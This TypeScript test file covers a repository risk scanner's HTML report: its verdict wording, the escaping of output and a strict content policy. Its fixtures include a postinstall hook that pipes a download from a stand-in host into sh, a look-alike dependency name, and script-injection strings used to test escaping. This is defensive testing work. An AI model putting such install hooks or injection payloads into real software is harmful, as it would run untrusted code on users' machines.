import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { assessRepository, formatRiskHtml, riskHeadline } from '../src/index.ts';
import type { RiskReport } from '../src/index.ts';

const file = (path: string, content: string) => ({ path, content });
const bad = assessRepository({
  files: [file('package.json', JSON.stringify({ scripts: { postinstall: 'curl -s https://example.test/a.sh | sh' }, dependencies: { crossenv: '1.0.0' } }))],
});
const clean = assessRepository({ files: [file('package.json', '{}')] });

describe('formatRiskHtml', () => {
  const html = formatRiskHtml(bad, { subject: 'https://github.com/octo/app', generatedAt: '2026-11-04 08:00 UTC', homeHref: '/check' });

  it('leads with the verdict and a warning not to run the project', () => {
    assert.match(html, /<section class="status red"><h2>High-risk signals found<\/h2>/);
    assert.match(html, /Do not install or run this project on your own computer/);
    assert.match(html, /<div class="tile red"><div class="value">1<\/div><div class="label">high<\/div><\/div>/);
  });

  it('shows each signal with its place and excerpt', () => {
    assert.match(html, /Downloads and runs code in &quot;postinstall&quot;/);
    assert.match(html, /<p class="where">package\.json:1<\/p>|<p class="where">package\.json:\d+<\/p>/);
    assert.match(html, /<code class="excerpt">curl -s https:\/\/example\.test\/a\.sh \| sh<\/code>/);
    assert.match(html, /looks like the popular package/);
  });

  it('always explains the limits and never calls anything safe', () => {
    for (const output of [html, formatRiskHtml(clean, { subject: 'x' })]) {
      assert.match(output, /Finding no signals does not mean a repository is safe/);
      assert.match(output, /disposable environment/);
      assert.equal(/\bsafe to (?:install|run|use)\b/i.test(output), false);
    }
    const quiet = formatRiskHtml(clean, { subject: 'x' });
    assert.match(quiet, /No serious signals found/);
    assert.match(quiet, /does not mean the project is safe/);
    assert.match(quiet, /No signals were found\./);
  });

  it('is self-contained: no scripts, no external resources, strict policy', () => {
    assert.equal(/<script/i.test(html), false);
    assert.equal(/https?:\/\/[^\s<"]*\.(?:css|js|png)/i.test(html), false);
    assert.match(html, /Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'"/);
    assert.match(html, /prefers-color-scheme:dark/);
  });

  it('escapes everything that comes from the repository', () => {
    const hostile = '<script>alert(1)</script><img src=x onerror=alert(2)>';
    const report: RiskReport = {
      signals: [{ id: 'x', severity: 'high', confidence: 'high', title: hostile, detail: hostile, file: hostile, line: 3, excerpt: hostile }],
      highest: 'high',
      scannedFiles: 1,
      checkedDependencies: 0,
      truncated: false,
      limitations: [hostile],
    };
    const output = formatRiskHtml(report, { subject: hostile, generatedAt: hostile, homeHref: hostile, banner: hostile });
    assert.equal(/<script/i.test(output), false);
    assert.equal(/<img/i.test(output), false);
    assert.ok(output.includes('&lt;script&gt;'));
  });
});

describe('riskHeadline', () => {
  it('picks the wording from the highest severity', () => {
    const base = { ...clean };
    assert.equal(riskHeadline({ ...base, highest: 'high' }).tone, 'red');
    assert.equal(riskHeadline({ ...base, highest: 'medium' }).tone, 'amber');
    for (const highest of ['low', 'info', 'none'] as const) assert.equal(riskHeadline({ ...base, highest }).tone, 'gray');
  });
});
